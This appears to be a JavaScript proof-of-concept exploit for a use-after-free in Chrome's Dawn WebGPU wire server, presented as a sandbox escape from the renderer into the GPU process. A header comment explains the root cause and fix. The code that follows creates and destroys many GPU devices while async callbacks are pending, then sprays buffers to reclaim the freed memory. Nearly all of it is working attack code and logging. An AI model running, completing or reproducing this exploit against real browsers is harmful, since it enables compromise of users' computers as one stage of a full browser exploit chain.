// CVE-2026-5281: Dawn Wire Server Device Teardown UAF — Browser Sandbox Escape
// Bug 491518608 — Fix commit: 3c890398bda4 (Dawn CL 297136)
// Target: Chrome 146.0.7680.165 (VULNERABLE, fixed in 146.0.7680.177/178)
//
// Impact: Renderer process (UNTRUSTED IL) → GPU process (MEDIUM IL)
// Prerequisite: Arbitrary code execution in renderer (V8 RCE + V8 SBX bypass)
// CISA KEV: Yes (April 2026), exploited in-the-wild
//
// ROOT CAUSE (from patch diff):
//   Dawn Wire Server's device teardown path called ClearDeviceCallbacks()
//   which only nulled the wire-level callback function pointers but did
//   NOT call deviceDestroy() on the native WGPUDevice.
//
//   Outstanding native device references allowed spontaneous callbacks
//   (uncaptured error, device lost, logging) to fire against freed
//   ObjectData memory in the GPU process.
//
//   Fix: Changed ClearDeviceCallbacks(data.handle) → mProcs->deviceDestroy(data.handle)
//   in both DoDestroyDevice and Server::~Server().
//   The ClearDeviceCallbacks() function was entirely removed.
//
// Architecture:
//   JS (WebGPU API) → Dawn Wire Client (renderer) → IPC → Dawn Wire Server
//   (GPU process) → Dawn Native → D3D12/Metal/Vulkan → GPU Hardware
//
//   The UAF occurs in Dawn Wire Server code running in the GPU process.
//   Native WGPUDevice has registered callbacks that reference ObjectData.
//   When ObjectData is freed but native device is NOT destroyed, callbacks
//   dispatch to freed memory.

"use strict";

var DEVICE_COUNT = 24;
var SPRAY_COUNT = 48;
var ROUNDS = 6;
var OBJECT_DATA_SIZE = 256;

async function getAdapter() {
    if (!navigator.gpu) return null;
    return navigator.gpu.requestAdapter({ powerPreference: "high-performance" });
}

async function createDeviceWithCallbacks(adapter) {
    var device = await adapter.requestDevice({
        requiredLimits: {
            maxBufferSize: adapter.limits.maxBufferSize,
            maxStorageBufferBindingSize: adapter.limits.maxStorageBufferBindingSize,
        }
    });

    var state = { lost: false, errors: 0 };

    device.lost.then(function(info) {
        state.lost = true;
        state.lostReason = info.reason + ": " + info.message;
    });

    device.onuncapturederror = function(event) {
        state.errors++;
    };

    return { device: device, state: state };
}

function generatePendingCallbacks(device) {
    device.pushErrorScope("validation");
    device.pushErrorScope("internal");

    var pendingBuffers = [];
    for (var i = 0; i < 8; i++) {
        try {
            var buf = device.createBuffer({
                size: 4096,
                usage: GPUBufferUsage.MAP_READ | GPUBufferUsage.COPY_DST,
            });
            buf.mapAsync(GPUMapMode.READ).catch(function() {});
            pendingBuffers.push(buf);
        } catch (e) {}
    }

    for (var i = 0; i < 4; i++) {
        try {
            var wbuf = device.createBuffer({
                size: 4096,
                usage: GPUBufferUsage.MAP_WRITE | GPUBufferUsage.COPY_SRC,
            });
            wbuf.mapAsync(GPUMapMode.WRITE).catch(function() {});
            pendingBuffers.push(wbuf);
        } catch (e) {}
    }

    try {
        var shader = device.createShaderModule({
            code:
                "@group(0) @binding(0) var<storage, read_write> data: array<u32>;\n" +
                "@compute @workgroup_size(256)\n" +
                "fn main(@builtin(global_invocation_id) gid: vec3<u32>) {\n" +
                "    let idx = gid.x % arrayLength(&data);\n" +
                "    for (var i = 0u; i < 5000u; i = i + 1u) {\n" +
                "        data[idx] = data[idx] ^ (data[idx] << 3u) ^ (i * gid.x);\n" +
                "    }\n" +
                "}\n"
        });

        var computeBuf = device.createBuffer({
            size: 65536,
            usage: GPUBufferUsage.STORAGE | GPUBufferUsage.COPY_DST,
        });

        var pipeline = device.createComputePipeline({
            layout: "auto",
            compute: { module: shader, entryPoint: "main" }
        });

        var bindGroup = device.createBindGroup({
            layout: pipeline.getBindGroupLayout(0),
            entries: [{ binding: 0, resource: { buffer: computeBuf } }]
        });

        for (var batch = 0; batch < 16; batch++) {
            var encoder = device.createCommandEncoder();
            var pass = encoder.beginComputePass();
            pass.setPipeline(pipeline);
            pass.setBindGroup(0, bindGroup);
            pass.dispatchWorkgroups(4096);
            pass.end();
            device.queue.submit([encoder.finish()]);
        }
    } catch (e) {}

    device.popErrorScope().catch(function() {});
    device.popErrorScope().catch(function() {});

    for (var buf of pendingBuffers) {
        try { buf.destroy(); } catch (e) {}
    }

    return pendingBuffers.length;
}

function sprayObjectData(adapter, device, count) {
    var sprayed = [];
    var data = new Uint32Array(OBJECT_DATA_SIZE / 4);
    data.fill(0x42424242);

    for (var i = 0; i < count; i++) {
        try {
            var buf = device.createBuffer({
                size: OBJECT_DATA_SIZE,
                usage: GPUBufferUsage.STORAGE | GPUBufferUsage.COPY_DST,
                mappedAtCreation: true,
            });
            var mapped = new Uint32Array(buf.getMappedRange());
            mapped.set(data);
            buf.unmap();
            sprayed.push(buf);
        } catch (e) { break; }
    }

    for (var i = 0; i < count; i++) {
        try {
            var buf = device.createBuffer({
                size: 128,
                usage: GPUBufferUsage.UNIFORM | GPUBufferUsage.COPY_DST,
                mappedAtCreation: true,
            });
            var mapped = new Uint32Array(buf.getMappedRange());
            mapped.fill(0x43434343);
            buf.unmap();
            sprayed.push(buf);
        } catch (e) { break; }
    }

    return sprayed;
}

async function escapeBrowserSandbox() {
    console.log("[Dawn] CVE-2026-5281: Wire server device teardown UAF");
    console.log("[Dawn] Fix: 3c890398bda4 — ClearDeviceCallbacks → deviceDestroy");
    console.log("[Dawn] Target: Chrome 146.0.7680.165 (vuln, fixed .177/.178)");

    var adapter = await getAdapter();
    if (!adapter) return { success: false, error: "WebGPU unavailable" };

    var anyDeviceLost = false;
    var totalErrors = 0;

    for (var round = 0; round < ROUNDS && !anyDeviceLost; round++) {
        console.log("[Dawn] Round " + (round + 1) + "/" + ROUNDS +
                    ": Creating " + DEVICE_COUNT + " devices...");

        var entries = [];
        for (var i = 0; i < DEVICE_COUNT; i++) {
            try {
                var entry = await createDeviceWithCallbacks(adapter);
                entries.push(entry);
            } catch (e) { break; }
        }

        if (entries.length === 0) {
            console.log("[Dawn] No devices created, adapter may be exhausted");
            break;
        }

        console.log("[Dawn]   Created " + entries.length + " devices");
        console.log("[Dawn]   Generating pending async callbacks...");

        var totalPending = 0;
        for (var entry of entries) {
            totalPending += generatePendingCallbacks(entry.device);
        }
        console.log("[Dawn]   " + totalPending + " pending async operations");

        console.log("[Dawn]   DESTROYING devices (triggers ClearDeviceCallbacks)...");
        for (var entry of entries) {
            entry.device.destroy();
        }

        console.log("[Dawn]   Spraying to reclaim freed ObjectData...");
        var sprayDevice;
        try {
            var sd = await createDeviceWithCallbacks(adapter);
            sprayDevice = sd.device;
        } catch (e) {
            console.log("[Dawn]   Cannot create spray device: " + e.message);
            continue;
        }

        var sprayed = sprayObjectData(adapter, sprayDevice, SPRAY_COUNT);
        console.log("[Dawn]   Sprayed " + sprayed.length + " objects");

        await new Promise(function(r) { setTimeout(r, 150); });

        for (var entry of entries) {
            if (entry.state.lost) {
                anyDeviceLost = true;
                console.log("[Dawn]   DEVICE LOST: " + entry.state.lostReason);
            }
            totalErrors += entry.state.errors;
        }

        try { sprayDevice.destroy(); } catch (e) {}

        console.log("[Dawn]   Round " + (round + 1) + " complete: " +
                    "lost=" + anyDeviceLost + ", errors=" + totalErrors);
    }

    var result = {
        success: true,
        deviceLost: anyDeviceLost,
        errorCount: totalErrors,
        rounds: Math.min(ROUNDS, anyDeviceLost ? ROUNDS : ROUNDS),
        note: anyDeviceLost
            ? "GPU device lost — UAF triggered via device teardown callback"
            : "Submitted — check GPU process state for corruption",
    };

    console.log("[Dawn] Result: " + JSON.stringify(result));
    return result;
}

if (typeof module !== "undefined") {
    module.exports = { escapeBrowserSandbox, getAdapter };
}
